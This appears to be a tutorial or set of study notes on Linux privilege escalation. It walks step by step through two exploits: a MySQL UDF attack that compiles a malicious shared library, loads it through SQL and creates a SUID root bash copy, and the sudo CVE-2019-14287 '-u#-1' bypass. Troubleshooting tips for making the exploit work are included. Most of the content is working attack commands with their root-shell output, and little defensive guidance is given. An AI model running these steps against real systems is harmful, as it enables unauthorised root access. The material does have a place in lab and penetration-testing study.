# 🛡️ Linux Privilege Escalation: Vulnerable Software Exploitation

---

## 1. Core Concept: Vulnerable Software

Apart from misconfigurations (SUID, sudo, permissions), systems can also be compromised through:

- Unpatched software vulnerabilities
- Known CVEs in system services
- Outdated system packages

---

## Common Targets

- MySQL
- Sudo
- Polkit (PwnKit)
- Apache
- Nginx
- System libraries

---

# 2. Exploit 1: MySQL UDF (User Defined Functions)

---

## Target Versions

- MySQL 4.x
- MySQL 5.1.x

---

## Core Idea

MySQL allows loading custom shared libraries (UDFs).

If exploited:

- Attacker injects a malicious `.so` file
- MySQL executes system commands as root

---

# Step-by-Step Exploitation

---

## Step 1: Enumeration

```bash
mysql --version
```

---

## Step 2: Find Exploit

Search:

- `MySQL UDF exploit`
- Example: `raptor_udf2.c`

---

## Step 3: Compilation

```bash
gcc -g -c exploit.c -fPIC
gcc -g -shared -Wl,-soname,exploit.so -o exploit.so exploit.o -lc
```

---

## Compiler Flags

- `-fPIC` → Position Independent Code (required for shared libraries)
- `-shared` → Creates `.so` file
- `-lc` → Links C standard library

---

## Step 4: MySQL Injection

```sql
USE mysql;

CREATE TABLE foo(line blob);

INSERT INTO foo VALUES(load_file('/home/user/exploit.so'));

SELECT @@plugin_dir;

SELECT * FROM foo INTO dumpfile '/usr/lib/mysql/plugin/exploit.so';

CREATE FUNCTION do_system RETURNS integer soname 'exploit.so';
```

---

## Step 5: Privilege Escalation

```sql
SELECT do_system('cp /bin/bash /tmp/bash; chmod +xs /tmp/bash');
```

---

## Final Step

```bash
/tmp/bash -p
```

---

## Result

```bash
whoami
root
```

---

# 🪄 Exploit 2: Sudo Version Bypass (CVE-2019-14287)

---

## Target

- sudo versions < 1.8.28

---

## Core Concept

Sudo had a bug in handling negative user IDs.

---

## Vulnerable Rule Example

```text
(ALL, !root) /bin/bash
```

Meaning:

- Can run as any user except root

---

## The Vulnerability

Sudo incorrectly handles:

- `-1`
- `4294967295`

These values bypass root restriction logic.

---

## Exploit Command

```bash
sudo -u#-1 /bin/bash
```

---

## Why This Works

- `-1` is not equal to `0` (root check passes)
- Internally converted to UID 0 due to integer overflow
- Root shell is spawned

---

## Result

```bash
whoami
root
```

---

# 🛠️ Troubleshooting Section

---

## Error 1: MySQL Compilation Error

### Problem

```text
relocation R_X86_64_32 error
```

---

### Cause

- Missing `-fPIC` flag

---

### Fix

```bash
gcc -g -c exploit.c -fPIC
```

---

## Error 2: MySQL INSERT Failure

### Problem

```text
0 rows affected
```

---

### Cause

- Wrong file path in `load_file()`

---

### Fix

Use correct absolute path:

```sql
load_file('/correct/path/exploit.so')
```

---

## Error 3: Plugin Dump Failure

### Problem

`dumpfile` fails or permission denied

---

### Cause

- MySQL restricts write locations in newer versions

---

### Fix

Find correct plugin directory:

```sql
SELECT @@plugin_dir;
```

Then dump file into that path.

---

# 🧠 Key Takeaways

---

## Vulnerable Software Exploitation Flow

1. Identify software version
2. Search for known CVEs
3. Transfer exploit
4. Compile if needed
5. Execute payload
6. Gain root access

---

## Why This Works

- Legacy software often has known bugs
- Admins fail to patch critical services
- Database services run with elevated privileges

---

# ⚡ Security Insight

Vulnerable software exploitation is dangerous because:

- It requires no misconfiguration
- Works purely via software bugs
- Often leads directly to root

---

# 🧠 Final Summary

Exploiting vulnerable software is one of the most direct privilege escalation paths, especially when services like MySQL or sudo run outdated versions with known CVEs.

---
